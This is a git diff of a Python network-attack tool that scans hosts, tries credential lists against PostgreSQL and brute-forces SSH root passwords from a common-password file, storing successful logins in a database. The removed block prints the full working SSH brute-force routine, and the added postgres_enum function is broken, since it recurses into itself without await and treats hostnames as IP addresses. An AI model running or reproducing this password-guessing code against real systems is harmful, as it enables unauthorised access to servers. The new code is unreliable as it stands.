@@ -6,6 +6,7 @@ import paramiko
 import traceback
 import time
 import os
+from ssh_login import ssh_login
 from dotenv import load_dotenv
 
 GREEN = '\033[32m'
@@ -91,7 +92,7 @@ async def resolve_hosts(hosts):
                 conn.commit()
             except socket.error as err:
                 print(f"Error resolving {host}: {err}")
-                ip_address = "offline"
+                ip_address = None
                 cur.execute("INSERT INTO hosts (hostname, ip_address, open_ports) VALUES (%s, %s, %s)", (host, ip_address, None))
                 conn.commit()
 
@@ -164,6 +165,26 @@ async def scan_host(host, hostname, scanner):
             print(f"{RED}Error updating last scanned timestamp for host {hostname} ({host}): {str(e)}{RESET}")
 
         return None
+    
+
+
+# Define the function to run if conditions are met
+async def postgres_enum(ip_address, port_list):
+
+    cur = conn.cursor()
+    
+    # Query the database for rows with a list of ports in the open_ports column
+    cur.execute("SELECT hostname, open_ports FROM hosts WHERE open_ports IS NOT NULL")
+    
+    # Loop through the results
+    for row in cur.fetchall():
+        ip_address = row[0]
+        open_ports = row[1]
+        if isinstance(open_ports, list) and ip_address is not None:
+            # Call the function with the IP address and port list
+            postgres_enum(ip_address, open_ports)
+
+
 
 async def connect_to_postgres(hosts, credentials):
     for host in hosts:
@@ -180,42 +201,6 @@ async def connect_to_postgres(hosts, credentials):
             except Exception as e:
                 print(f"{RED}Could not connect to PostgreSQL on {RESET}{host} {RED}with credentials: {RESET}{username}:{password}: {e}")
 
-async def ssh_login(ip_dict, password_file):
-    with open(password_file, 'r', encoding='utf-8', errors='ignore') as file:
-        passwords = file.read().splitlines()
-
-        cur = conn.cursor()
-        for host, ip in ip_dict.items():
-            print(f"Attempting SSH login on {ip}...")
-            client = paramiko.SSHClient()
-            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-            for pw in passwords:
-                try:
-                    print(f"{GREEN}Trying {RESET}{pw} {GREEN} as a password{RESET}")
-                    await asyncio.get_event_loop().run_in_executor(
-                        None,
-                        lambda: client.connect(str(ip), username='root', password=pw, timeout=15),
-                    )
-                    print(f"{GREEN}Successful login on {RESET}{ip}{GREEN} with password:{RESET} {pw}")
-
-                    cur.execute("INSERT INTO ssh_logins (hostname, ip_address, password) VALUES (%s, %s, %s)", (host, ip, pw))
-                    conn.commit()
-                    client.close()
-                    break
-                except paramiko.AuthenticationException:
-                    # Incorrect password, continue to the next one
-                    continue
-                except paramiko.SSHException:
-                    print(f"{RED}Failed to connect to{RESET} {ip}")
-                    break
-                except socket.timeout:
-                    print(f"{RED}Connection timed out for {RESET}{ip}")
-                    break
-                except paramiko.ssh_exception.NoValidConnectionsError as e:
-                    print(f"{RED}Unable to connect to port 22 on {RESET}{ip}")
-                    print(f"{RED}Error: {RESET}{str(e)}")
-                    break
 
 def list_checker():
     cur = conn.cursor()
@@ -256,7 +241,7 @@ async def main():
         await connect_to_postgres(postgres_open, credentials)
 
         # Perform SSH login on the resolved hosts
-        await ssh_login(host_dict, 'common_root_passwords.txt')
+        await ssh_login('usernames.txt', 'common_root_passwords.txt')
         
     except Exception as e:
         print(f"{RED}Error running main function: {str(e)}{RESET}")
